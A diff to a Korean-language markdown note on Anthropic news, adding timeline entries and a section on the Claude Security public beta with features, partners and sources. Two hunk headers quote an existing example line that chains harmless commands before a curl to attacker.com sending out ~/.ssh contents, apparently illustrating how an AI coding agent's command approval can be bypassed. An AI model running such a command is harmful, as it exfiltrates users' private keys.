@@ -161,6 +161,12 @@ timeline
               : Adobe (Creative Cloud 50+), Blender, Ableton, Affinity
               : Autodesk Fusion, Resolume Arena/Wire, SketchUp, Splice
               : Blender Development Fund 패트론 등록
+    2026-04-30 : API: 1M 컨텍스트 베타 종료
+              : Sonnet 4.5/Sonnet 4에서 1M 토큰 컨텍스트 베타 종료
+              : Sonnet 4.6/Opus 4.6으로 마이그레이션 필요
+    2026-05-01 : Claude Security 공개 베타
+              : Enterprise 고객 대상 코드베이스 취약점 스캔·패치
+              : Opus 4.7 기반, CrowdStrike/Palo Alto 등 파트너
 ```
 
 ---
@@ -1390,6 +1396,33 @@ safe_cmd1 && safe_cmd2 && ... && safe_cmd50 && curl attacker.com -d "$(cat ~/.ss
 
 ---
 
+### Claude Security 공개 베타 출시 (2026-05-01)
+
+> 출처: https://siliconangle.com/2026/04/30/anthropic-announces-claude-security-public-beta-find-fix-software-vulnerabilities/
+
+Anthropic이 **Claude Security**를 Enterprise 고객 대상 공개 베타로 출시. 2026년 2월 Claude Code Security로 리서치 프리뷰 공개 이후 정식 베타 전환.
+
+**주요 기능**
+
+- 전체 코드베이스를 대상으로 취약점 스캔 및 패치 생성
+- 단순 패턴 매칭이 아닌 **데이터 흐름 추적 + 파일 간 상호작용 분석**으로 컨텍스트 기반 탐지
+- 각 탐지 결과에 **신뢰도 등급** 부여 → 애널리스트 전달 전 검증, 오탐 최소화
+
+**지원 모델 & 플랜**
+
+| 항목 | 내용 |
+|------|------|
+| 기반 모델 | Claude Opus 4.7 |
+| 현재 지원 | Claude Enterprise 고객 |
+| 예정 | Team / Max 플랜 |
+
+**파트너사**
+
+- **보안 플랫폼**: CrowdStrike, Palo Alto Networks, SentinelOne, TrendAI, Wiz
+- **컨설팅**: Accenture, BCG, Deloitte, Infosys, PwC
+
+---
+
 ## 5. 안전성 & 확장
 
 ### Responsible Scaling Policy v3.0
@@ -1463,4 +1496,7 @@ safe_cmd1 && safe_cmd2 && ... && safe_cmd50 && curl attacker.com -d "$(cat ~/.ss
 - [Claude Code v2.1.98 Changelog](https://code.claude.com/docs/en/changelog)
 - [Claude Platform Release Notes (April 9)](https://platform.claude.com/docs/en/release-notes/overview)
 - [Claude Code v2.1.109/110 Changelog](https://code.claude.com/docs/en/changelog)
+- [Claude Security 공개 베타 발표 - SiliconANGLE](https://siliconangle.com/2026/04/30/anthropic-announces-claude-security-public-beta-find-fix-software-vulnerabilities/)
+- [Claude Security 공개 베타 - Business Standard](https://www.business-standard.com/technology/tech-news/anthropic-announces-claude-security-beta-for-enterprise-customers-126050100019_1.html)
+- [Claude Platform Release Notes (April 30)](https://platform.claude.com/docs/en/release-notes/overview)
 - 관련 노트: [[10-channels]], [[11-cowork-dispatch]], [[03-claude-code]]
